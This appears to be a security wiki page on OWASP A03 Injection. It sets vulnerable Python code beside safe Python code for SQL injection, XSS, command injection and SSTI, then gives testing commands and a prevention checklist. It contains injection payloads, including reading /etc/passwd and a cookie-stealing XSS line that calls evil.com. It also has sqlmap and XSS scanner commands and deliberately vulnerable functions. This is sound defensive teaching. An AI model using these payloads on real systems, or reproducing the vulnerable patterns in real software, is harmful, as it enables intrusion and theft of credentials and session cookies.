---
title: "A03 — Injection"
date: 2026-08-05
tags: ["OWASP", "injection", "SQL-injection", "XSS", "command-injection", "SSTI"]
categories: ["owasp"]
description: "OWASP A03 Injection — SQL injection, XSS, command injection, SSTI. STRIDE mapping, vulnerable vs safe code examples, and detection methods."
showToc: true
layout: "single"
---

## Overview

Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing data without proper authorisation.

| Attribute | Detail |
|---|---|
| OWASP rank | #3 (2021) — was #1 for 10 years |
| STRIDE mapping | **Tampering, Elevation of Privilege** |
| CWEs mapped | 33 (incl. CWE-79, CWE-89, CWE-73) |
| Types | SQL, NoSQL, OS command, LDAP, XSS, SSTI, XXE |

---

## Injection types

| Type | Interpreter | Payload example |
|---|---|---|
| SQL injection | Database | `' OR '1'='1` |
| Cross-Site Scripting (XSS) | Browser HTML engine | `<script>document.cookie</script>` |
| Command injection | OS shell | `; cat /etc/passwd` |
| SSTI | Template engine | `{{7*7}}` → `49` |
| LDAP injection | Directory server | `*)(uid=*))(|(uid=*` |
| XXE | XML parser | External entity reference |

---

## STRIDE mapping

| Threat | Mechanism |
|---|---|
| **Tampering** | SQL injection modifies, deletes, or inserts database records |
| **Elevation of Privilege** | SQLi extracts credentials; command injection achieves RCE as web server user |
| **Information Disclosure** | SQLi dumps tables; XSS steals session cookies and credentials |
| **Spoofing** | Stored XSS impersonates legitimate site to steal user credentials |

---

## Vulnerable vs safe code

### SQL Injection

```python
import sqlite3
import psycopg2

# VULNERABLE — string concatenation
def get_user_wrong(username: str) -> dict:
    conn = sqlite3.connect("app.db")
    query = f"SELECT * FROM users WHERE username = '{username}'"
    # Payload: username = "admin'--"  → bypasses password check
    # Payload: username = "' UNION SELECT * FROM credit_cards--"
    return conn.execute(query).fetchone()

# SAFE — parameterised query
def get_user(username: str) -> dict:
    conn = psycopg2.connect(DATABASE_URL)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, username, email FROM users WHERE username = %s",
        (username,)   # parameter, never concatenated
    )
    return cursor.fetchone()

# SAFE — ORM (SQLAlchemy)
from sqlalchemy.orm import Session

def get_user_orm(db: Session, username: str):
    return db.query(User).filter(User.username == username).first()
    # SQLAlchemy always uses parameterised queries internally
```

### Cross-Site Scripting (XSS)

```python
from markupsafe import escape
from html import escape as html_escape

# VULNERABLE — reflected XSS
@app.route("/search")
def search():
    query = request.args.get("q", "")
    # Payload: ?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
    return f"<h1>Results for: {query}</h1>"  # directly injected into HTML

# VULNERABLE — stored XSS
@app.post("/comments")
def post_comment(body: str):
    db.save_comment(body)          # stores raw HTML
    return render_template("comment.html", body=body)   # renders unescaped

# SAFE — escape all output
@app.route("/search")
def search():
    query = request.args.get("q", "")
    safe_query = escape(query)     # converts < to &lt; > to &gt; etc.
    return f"<h1>Results for: {safe_query}</h1>"

# SAFE — use template engine with auto-escaping (Jinja2 default)
# comment.html:
# <p>{{ comment.body }}</p>   ← Jinja2 auto-escapes by default
```

### Content Security Policy (defence in depth against XSS)

```python
@app.after_request
def add_csp(response):
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-{nonce}'; "   # nonce-based, no unsafe-inline
        "style-src 'self'; "
        "img-src 'self' data: https:; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "frame-ancestors 'none'"
    )
    return response
```

### OS Command Injection

```python
import subprocess
import shlex

# VULNERABLE — shell=True with user input
def ping_host_wrong(hostname: str) -> str:
    # Payload: hostname = "google.com; cat /etc/passwd"
    result = subprocess.run(f"ping -c 1 {hostname}", shell=True, capture_output=True)
    return result.stdout.decode()

# SAFE — list form, no shell, strict validation
import re

def ping_host(hostname: str) -> str:
    # Validate input strictly first
    if not re.match(r'^[a-zA-Z0-9.\-]{1,253}$', hostname):
        raise ValueError("Invalid hostname")
    # Use list form — no shell interpretation
    result = subprocess.run(
        ["ping", "-c", "1", hostname],
        shell=False,               # never shell=True with user input
        capture_output=True,
        timeout=5
    )
    return result.stdout.decode()
```

### Server-Side Template Injection (SSTI)

```python
from jinja2 import Environment, BaseLoader, sandbox

# VULNERABLE — rendering user input as a template
@app.route("/greet")
def greet():
    name = request.args.get("name", "World")
    # Payload: ?name={{7*7}} → "Hello 49"
    # Payload: ?name={{config}} → dumps Flask config including SECRET_KEY
    template = f"Hello {name}!"
    return Environment(loader=BaseLoader()).from_string(template).render()

# SAFE — use data context, never render user input as template source
@app.route("/greet")
def greet():
    name = request.args.get("name", "World")
    # Pass as data to a fixed template
    return render_template("greet.html", name=name)
    # greet.html: <p>Hello {{ name }}!</p>  ← escaped by Jinja2

# If dynamic templates are truly needed — use sandbox
env = sandbox.SandboxedEnvironment()
```

---

## Detection & testing methods

```bash
# SQL Injection
sqlmap -u "https://target.com/users?id=1" --dbs --level=3 --risk=2
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --forms

# XSS — manual payloads
# Basic reflected: <script>alert(1)</script>
# Bypass filters: <img src=x onerror=alert(1)>
# Attribute context: " onmouseover="alert(1)
# DOM-based: javascript:alert(1)

# Automated XSS
dalfox url "https://target.com/search?q=test"
xsser --url "https://target.com/search?q=XSS"

# Command injection payloads
# Linux: ; id, | id, && id, `id`, $(id)
# Windows: & whoami, | whoami

# SSTI detection
# Jinja2/Twig: {{7*7}} → 49
# FreeMarker: ${7*7} → 49
# Velocity: #set($x=7*7)$x → 49

# SAST scanning
semgrep --config "p/sql-injection" --config "p/xss" .
bandit -r . -t B608   # SQL injection in Python
```

---

## Prevention checklist

```
□ Use parameterised queries / prepared statements for ALL database queries
□ Use an ORM — never concatenate user input into SQL
□ Validate and whitelist input — reject unexpected characters
□ Escape output context-appropriately (HTML, JS, CSS, URL)
□ Use a template engine with auto-escaping enabled by default
□ Never use shell=True with user-controlled input
□ Implement Content Security Policy to limit XSS impact
□ Run SAST on every commit — flag injection patterns in CI
□ Use least-privilege database accounts — no DROP or admin privileges
□ DAST scan with SQLmap and XSS tools before every release
```

<div class="references-section">

## 📚 Related pages

<div class="ref-grid">
  <a class="ref-card" href="/wiki/owasp-top10/"><span class="ref-label">OWASP</span>OWASP Top 10 Overview</a>
  <a class="ref-card" href="/wiki/owasp-top10/a01-broken-access-control/"><span class="ref-label">OWASP</span>A01 Broken Access Control</a>
  <a class="ref-card" href="/wiki/secure-architecture/api-security/"><span class="ref-label">Architecture</span>API Security Design</a>
  <a class="ref-card" href="/wiki/stride/"><span class="ref-label">Framework</span>STRIDE — Tampering</a>
  <a class="ref-card" href="/posts/05-threat-modelling-in-devsecops/"><span class="ref-label">Post</span>Threat Modelling in DevSecOps</a>
  <a class="ref-card" href="/wiki/supply-chain/"><span class="ref-label">Wiki</span>Supply Chain Security</a>
</div>

</div>
